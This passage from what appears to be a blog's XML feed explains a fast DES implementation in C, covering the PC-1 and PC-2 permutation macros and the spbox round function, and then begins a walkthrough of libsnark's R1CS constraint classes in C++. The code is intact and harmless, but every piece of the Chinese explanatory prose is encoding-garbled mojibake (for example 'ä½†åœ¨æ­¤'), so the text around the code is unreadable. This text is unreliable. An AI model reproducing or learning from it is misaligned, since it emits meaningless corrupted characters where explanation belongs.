class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä½†åœ¨æ­¤ä¹‹å‰éœ€è¦ç»è¿‡ä¸‹è¿°ä¸¤æ¬¡shuffleï¼ˆåŒæ ·ä¹Ÿæ˜¯é€šè¿‡PC-1åçš„çŠ¶æ€æ¥<strong>é€†æ¨</strong>ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">X = </span><br><span class="line"> <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = ((Y &gt;&gt; <span class="number">4</span>) ^ X) &amp; <span class="number">0x0f0f0f0f</span></span><br><span class="line">X ^= T</span><br><span class="line">Y ^= (T &lt;&lt; <span class="number">4</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"> <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span></span><br><span class="line">Y = </span><br><span class="line"> <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = (Y ^ X) &amp; <span class="number">0x10101010</span></span><br><span class="line">X ^= T</span><br><span class="line">Y ^= T</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"> <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">8</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">16</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">24</span> <span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">32</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span></span><br><span class="line">Y = </span><br><span class="line"> <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">4</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">12</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">20</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">28</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span></span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„PC-1ç›¸å…³ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PC1(X, Y) &#123;                                                             \</span></span><br><span class="line">    <span class="keyword">uint32_t</span> T;                                                                 \</span><br><span class="line">    T = (((Y) &gt;&gt; <span class="number">4</span>) ^ (X)) &amp; <span class="number">0x0f0f0f0f</span>; (X) ^= T; (Y) ^= (T &lt;&lt; <span class="number">4</span>);             \</span><br><span class="line">    T = ((Y) ^ (X)) &amp; <span class="number">0x10101010</span>; (X) ^= T; (Y) ^= T;                           \</span><br><span class="line">    (X) = (PC1_L[((X) &gt;&gt; <span class="number">29</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">4</span>) | (PC1_L[((X) &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x0f</span>])        \</span><br><span class="line">      | (PC1_L[((X) &gt;&gt; <span class="number">21</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">5</span>) | (PC1_L[((X) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">1</span>)     \</span><br><span class="line">      | (PC1_L[((X) &gt;&gt; <span class="number">13</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">6</span>) | (PC1_L[((X) &gt;&gt;  <span class="number">8</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">2</span>)     \</span><br><span class="line">      | (PC1_L[((X) &gt;&gt;  <span class="number">5</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">7</span>) | (PC1_L[(X      ) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">3</span>);      \</span><br><span class="line">    (Y) = (PC1_R[((Y) &gt;&gt; <span class="number">29</span>) &amp; <span class="number">0x0f</span>] &gt;&gt; <span class="number">4</span>) | (PC1_R[((Y) &gt;&gt; <span class="number">25</span>) &amp; <span class="number">0x0f</span>])        \</span><br><span class="line">      | (PC1_R[((Y) &gt;&gt; <span class="number">21</span>) &amp; <span class="number">0x0f</span>] &gt;&gt; <span class="number">3</span>) | (PC1_R[((Y) &gt;&gt; <span class="number">17</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">1</span>)     \</span><br><span class="line">      | (PC1_R[((Y) &gt;&gt; <span class="number">13</span>) &amp; <span class="number">0x0f</span>] &gt;&gt; <span class="number">2</span>) | (PC1_R[((Y) &gt;&gt;  <span class="number">9</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">2</span>)     \</span><br><span class="line">      | (PC1_R[((Y) &gt;&gt;  <span class="number">5</span>) &amp; <span class="number">0x0f</span>] &gt;&gt; <span class="number">1</span>) | (PC1_R[((Y) &gt;&gt;  <span class="number">1</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">3</span>);    \</span><br><span class="line">    (X) &amp;= <span class="number">0x0fffffff</span>;                                                          \</span><br><span class="line">    (Y) &amp;= <span class="number">0x0fffffff</span>;                                                          \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>PC-2</p><p>PC-2å°±ä¸å­˜åœ¨å’ŒPC-1è¿™æ ·æ˜¾è‘—çš„ç‰¹å¾ï¼Œå› æ­¤åªèƒ½å»å°†<strong>ä¿æŒåŸæœ‰ç›¸å¯¹ä½ç½®</strong>çš„bitåˆ’åˆ†è‡³åŒä¸€æ‰¹å¤„ç†ï¼Œå°½å¯èƒ½å‡å°‘ä½è¿ç®—æ­¥éª¤ï¼Œe.g. ä¸‹å›¾æ‰€ç¤ºçš„åŸå§‹ç¬¬8ã€ç¬¬12 bitèƒ½ä¸€èµ·å¤„ç†<code>(((X) &lt;&lt; 16) &amp; 0x00110000)</code></p><p><img src= "/img/loading.gif" data-src="/2021/10/28/Engineering-Practice-of-Cryptosystem/QQå›¾ç‰‡20211028215620.jpg" alt></p><p>å®Œæ•´çš„PC-2ç›¸å…³ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PC2(X, Y, K) &#123;                                                  \</span></span><br><span class="line">    (K)[<span class="number">0</span>] = (((X) &lt;&lt;  <span class="number">9</span>) &amp; <span class="number">0x00800000</span>) | (((X) &lt;&lt; <span class="number">11</span>) &amp; <span class="number">0x00400000</span>)    \</span><br><span class="line">         | (((X) &lt;&lt;  <span class="number">4</span>) &amp; <span class="number">0x00200000</span>) | (((X) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">0x00110000</span>)      \</span><br><span class="line">         | (((X) &gt;&gt;  <span class="number">8</span>) &amp; <span class="number">0x000a4000</span>) | (((X) &gt;&gt;  <span class="number">5</span>) &amp; <span class="number">0x00040000</span>)      \</span><br><span class="line">         | (((X) &lt;&lt;  <span class="number">2</span>) &amp; <span class="number">0x00008008</span>) | (((X) &lt;&lt;  <span class="number">6</span>) &amp; <span class="number">0x00002800</span>)      \</span><br><span class="line">         | (((X) &lt;&lt;  <span class="number">1</span>) &amp; <span class="number">0x00000400</span>) | (((X) &gt;&gt;  <span class="number">6</span>) &amp; <span class="number">0x00001004</span>)      \</span><br><span class="line">         | (((X) &gt;&gt;  <span class="number">7</span>) &amp; <span class="number">0x00000220</span>) | (((X) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x00000100</span>)      \</span><br><span class="line">         | (((X) &lt;&lt;  <span class="number">5</span>) &amp; <span class="number">0x00000080</span>) | (((X) &gt;&gt; <span class="number">14</span>) &amp; <span class="number">0x00000042</span>)      \</span><br><span class="line">         | (((X) &gt;&gt; <span class="number">17</span>) &amp; <span class="number">0x00000010</span>) | (((X) &gt;&gt; <span class="number">26</span>) &amp; <span class="number">0x00000001</span>);     \</span><br><span class="line">    (K)[<span class="number">1</span>] = (((Y) &lt;&lt;  <span class="number">8</span>) &amp; <span class="number">0x00800100</span>) | (((Y) &lt;&lt; <span class="number">18</span>) &amp; <span class="number">0x00400000</span>)    \</span><br><span class="line">         | (((Y) &gt;&gt;  <span class="number">4</span>) &amp; <span class="number">0x00200000</span>) | (((Y) &lt;&lt;  <span class="number">1</span>) &amp; <span class="number">0x00100000</span>)      \</span><br><span class="line">         | (((Y) &lt;&lt; <span class="number">10</span>) &amp; <span class="number">0x00088000</span>) | (((Y) &lt;&lt; <span class="number">17</span>) &amp; <span class="number">0x00040000</span>)      \</span><br><span class="line">         | (((Y) &gt;&gt;  <span class="number">9</span>) &amp; <span class="number">0x00020000</span>) | ((Y      ) &amp; <span class="number">0x00010000</span>)        \</span><br><span class="line">         | (((Y) &lt;&lt;  <span class="number">3</span>) &amp; <span class="number">0x00004440</span>) | (((Y) &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x00002010</span>)      \</span><br><span class="line">         | (((Y) &lt;&lt;  <span class="number">4</span>) &amp; <span class="number">0x00001000</span>) | (((Y) &gt;&gt;  <span class="number">1</span>) &amp; <span class="number">0x00000800</span>)      \</span><br><span class="line">         | (((Y) &gt;&gt;  <span class="number">8</span>) &amp; <span class="number">0x00000200</span>) | (((Y) &gt;&gt; <span class="number">15</span>) &amp; <span class="number">0x00000080</span>)      \</span><br><span class="line">         | (((Y) &gt;&gt;  <span class="number">5</span>) &amp; <span class="number">0x00000020</span>) | (((Y) &gt;&gt;  <span class="number">3</span>) &amp; <span class="number">0x00000008</span>)      \</span><br><span class="line">         | (((Y) &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x00000004</span>) | (((Y) &gt;&gt; <span class="number">26</span>) &amp; <span class="number">0x00000002</span>)      \</span><br><span class="line">         | (((Y) &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x00000001</span>);                                  \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Expansion Function</p><p><img src= "/img/loading.gif" data-src="/2021/10/28/Engineering-Practice-of-Cryptosystem/image-20211028220127659.png" alt="image-20211028220127659"></p><p>æ¯è¡Œå‡ä¸ºè¿ç»­åºåˆ—ï¼Œç±»ä¼¼PC-2è¿›è¡Œä½å¤„ç†ï¼ˆé¦–æœ«è¡Œç‰¹æ®Šå¤„ç†ï¼‰</p><p>è½®å‡½æ•°ä»£ç å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> f(L, R, K) &#123;                                                                        \</span></span><br><span class="line">    (L) ^= spbox[<span class="number">0</span>][((((R) &gt;&gt; <span class="number">27</span>) &amp; <span class="number">0x1f</span>) | (((R) &lt;&lt; <span class="number">5</span>) &amp; <span class="number">0x20</span>)) ^ (((K)[<span class="number">0</span>] &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3f</span>)] \</span><br><span class="line">       | spbox[<span class="number">1</span>][(((R) &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">0</span>] &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3f</span>)]                           \</span><br><span class="line">       | spbox[<span class="number">2</span>][(((R) &gt;&gt; <span class="number">19</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">0</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>)]                            \</span><br><span class="line">       | spbox[<span class="number">3</span>][(((R) &gt;&gt; <span class="number">15</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">0</span>]) &amp; <span class="number">0x3f</span>)]                                 \</span><br><span class="line">       | spbox[<span class="number">4</span>][(((R) &gt;&gt; <span class="number">11</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">1</span>] &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3f</span>)]                           \</span><br><span class="line">       | spbox[<span class="number">5</span>][(((R) &gt;&gt; <span class="number">7</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">1</span>] &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3f</span>)]                            \</span><br><span class="line">       | spbox[<span class="number">6</span>][(((R) &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">1</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>)]                             \</span><br><span class="line">       | spbox[<span class="number">7</span>][((((R) &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x3e</span>) | (((R) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x01</span>)) ^ (((K)[<span class="number">1</span>]) &amp; <span class="number">0x3f</span>)];        \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>æœ€åçš„æ€§èƒ½æµ‹è¯•åœ¨25us/KBå·¦å³ğŸ‘ç®—æ˜¯ä¸€ä¸ªæ¯”è¾ƒæ˜¾è‘—çš„æå‡ï¼ˆ</p><p>AESå’ŒSM4çš„ç›¸å…³æ€§èƒ½ä¼˜åŒ–trickå®é™…ä¸Šå’Œå‰é¢åœ¨DESä¸­<code>gen_spbox()</code>çš„é¢„å¤„ç†ç±»ä¼¼ï¼Œæœ¬è´¨ä¸Šéƒ½æ˜¯ç©ºé—´æ¢æ—¶é—´ï¼ˆTè¡¨ï¼‰ï¼Œä¸åœ¨æ­¤èµ˜è¿°</p><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p>ç®€åŒ–ä½è¿ç®—ç›¸å…³å¯ä»¥ç§»æ­¥è¿™æœ¬ä¹¦ğŸ‘‡</p><p><a href="https://books.google.com.hk/books?id=iBNKMspIlqEC&amp;lpg=SL20-PA11&amp;vq=Transposing+an+8x8-bit+matrix&amp;pg=SL20-PA11&amp;redir_esc=y#v=snippet&amp;q=Transposing%20an%208x8-bit%20matrix&amp;f=false" target="_blank" rel="noopener">https://books.google.com.hk/books?id=iBNKMspIlqEC&amp;lpg=SL20-PA11&amp;vq=Transposing+an+8x8-bit+matrix&amp;pg=SL20-PA11&amp;redir_esc=y#v=snippet&amp;q=Transposing%20an%208x8-bit%20matrix&amp;f=false</a></p>]]></content>
      
      
      <categories>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>libsnark_related</title>
      <link href="/2021/10/17/libsnark-related/"/>
      <url>/2021/10/17/libsnark-related/</url>
      
        <content type="html"><![CDATA[<blockquote><p>è¿‘æ—¥å› ä¸ºç§ç§åŸå› åˆæ‹¾èµ·äº†é›¶çŸ¥è¯†è¯æ˜æ–¹å‘çš„ç›¸å…³å·¥ä½œï¼Œäºæ˜¯åœ¨æ­¤ç®€ç•¥åšä¸€ä¸‹libsnarkç›¸å…³çš„è®°å½•</p><p><a href="https://github.com/scipr-lab/libsnark/tree/2af440246fa2c3d0b1b0a425fb6abd8cc8b9c54d" target="_blank" rel="noopener">https://github.com/scipr-lab/libsnark/tree/2af440246fa2c3d0b1b0a425fb6abd8cc8b9c54d</a></p></blockquote><p>åŸºäºzk-SNARKså®ç°éäº¤äº’å¼é›¶çŸ¥è¯†è¯æ˜åº”ç”¨çš„å¼€å‘é¡ºåºå¯ä»¥æ¦‚æ‹¬å¦‚ä¸‹ï¼š</p><ol><li><p>åˆ›å»ºä¸€ä¸ªr1cs_constraint_systemï¼ˆlibsnarkè®¾è®¡äº†gadgetçš„æ¡†æ¶å¸®åŠ©æ„å»ºï¼‰ï¼›</p></li><li><p>ç”Ÿæˆproving keyå’Œverification keyï¼›</p></li><li><p>Aliceä½¿ç”¨proving keyå’Œæ‹¥æœ‰çš„å¯è¡Œè§£æ„é€ è¯æ˜$\pi$ï¼›</p></li><li><p>Bobä½¿ç”¨verification keyéªŒè¯$\pi$ï¼›</p></li></ol><hr><p>ä¸‹é¢å‚è€ƒ<a href="https://zhuanlan.zhihu.com/p/46477111" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/46477111</a>ä¸­ç»™å‡ºçš„ä¾‹å­ï¼Œé€æ­¥è·Ÿè¿›ï¼Œå¯¹gadgetlib1çš„ç›¸å…³æºç è¿›è¡Œè§£æï¼š</p><p>å…ˆå®šä½åˆ°æ·»åŠ r1csçº¦æŸç›¸å…³çš„<code>add_r1cs_constraint</code>ï¼š</p><p><strong>libsnark/gadgetlib1/protoboard.hpp : L51 &amp; protoboard.tcc : L100-110</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_r1cs_constraint</span><span class="params">(<span class="keyword">const</span> r1cs_constraint&lt;FieldT&gt; &amp;constr, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;annotation=<span class="string">""</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="keyword">void</span> protoboard&lt;FieldT&gt;::add_r1cs_constraint(<span class="keyword">const</span> r1cs_constraint&lt;FieldT&gt; &amp;constr, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;annotation)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    assert(annotation != <span class="string">""</span>);</span><br><span class="line">    constraint_system.constraint_annotations[constraint_system.constraints.size()] = annotation;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    libff::UNUSED(annotation);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    constraint_system.constraints.emplace_back(constr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>r1cs_constraint_system&lt;FieldT&gt; constraint_system</code></p><p>ä¸”<code>constraint_system.constraints</code>çš„ç±»å‹ä¸º<code>std::vector&lt;r1cs_constraint&lt;FieldT&gt; &gt;</code></p><p>äºæ˜¯æˆ‘ä»¬è·Ÿè¿›åˆ°<code>r1cs_constraint</code>ç±»ï¼š</p><p><strong>libsnark/relations/constraint_satisfaction_problems/r1cs/r1cs.hpp : L41-70</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A R1CS constraint is a formal expression of the form</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *                &lt; A , X &gt; * &lt; B , X &gt; = &lt; C , X &gt; ,</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * where X = (x_0,x_1,...,x_m) is a vector of formal variables and A,B,C each</span></span><br><span class="line"><span class="comment"> * consist of 1+m elements in &lt;FieldT&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A R1CS constraint is used to construct a R1CS constraint system (see below).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">r1cs_constraint</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    linear_combination&lt;FieldT&gt; a, b, c;</span><br><span class="line"></span><br><span class="line">    r1cs_constraint() &#123;&#125;;</span><br><span class="line">    r1cs_constraint(<span class="keyword">const</span> linear_combination&lt;FieldT&gt; &amp;a,</span><br><span class="line">                    <span class="keyword">const</span> linear_combination&lt;FieldT&gt; &amp;b,</span><br><span class="line">                    <span class="keyword">const</span> linear_combination&lt;FieldT&gt; &amp;c);</span><br><span class="line"></span><br><span class="line">    r1cs_constraint(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;linear_combination&lt;FieldT&gt; &gt; &amp;A,</span><br><span class="line">                    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;linear_combination&lt;FieldT&gt; &gt; &amp;B,</span><br><span class="line">                    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;linear_combination&lt;FieldT&gt; &gt; &amp;C);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>==(<span class="keyword">const</span> r1cs_constraint&lt;FieldT&gt; &amp;other) <span class="keyword">const</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream&amp; <span class="keyword">operator</span>&lt;&lt; &lt;FieldT&gt;(<span class="built_in">std</span>::ostream &amp;out, <span class="keyword">const</span> r1cs_constraint&lt;FieldT&gt; &amp;c);</span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::istream&amp; <span class="keyword">operator</span>&gt;&gt; &lt;FieldT&gt;(<span class="built_in">std</span>::istream &amp;in, r1cs_constraint&lt;FieldT&gt; &amp;c);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°å‚æ•°ç±»å‹ä¸º<code>linear_combination</code>çš„æ„é€ å‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›ç›¸å…³ç±»ï¼š</p><p><img src= "/img/loading.gif" data-src="/2021/10/17/libsnark-related/image-20211017201752561.png" alt="image-20211017201752561"></p><p><img src= "/img/loading.gif" data-src="/2021/10/17/libsnark-related/image-20211017205311619.png" alt="image-20211017205311619"></p><p><strong>libsnark/relations/variable.hpp : L144-158</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A linear combination represents a formal expression of the form "sum_i coeff_i * x_&#123;index_i&#125;".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">linear_combination</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;linear_term&lt;FieldT&gt; &gt; terms;</span><br><span class="line"></span><br><span class="line">    linear_combination() &#123;&#125;;</span><br><span class="line">    linear_combination(<span class="keyword">const</span> <span class="keyword">integer_coeff_t</span> int_coeff);</span><br><span class="line">    linear_combination(<span class="keyword">const</span> FieldT &amp;field_coeff);</span><br><span class="line">    linear_combination(<span class="keyword">const</span> variable&lt;FieldT&gt; &amp;var);</span><br><span class="line">    linear_combination(<span class="keyword">const</span> linear_term&lt;FieldT&gt; &amp;lt);</span><br><span class="line">    linear_combination(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;linear_term&lt;FieldT&gt; &gt; &amp;all_terms);</span><br></pre></td></tr></table></figure><p>å‚æ•°ç±»å‹ä¸º<code>std::vector&lt;linear_term&lt;FieldT&gt; &gt;</code>çš„æ„é€ å‡½æ•°å…·ä½“å®ç°å¦‚ä¸‹ï¼š</p><p><strong>libsnark/relations/variable.tcc : L484-508</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line">linear_combination&lt;FieldT&gt;::linear_combination(<span class="keyword">const</span> <span class="built_in">std</span>::<span 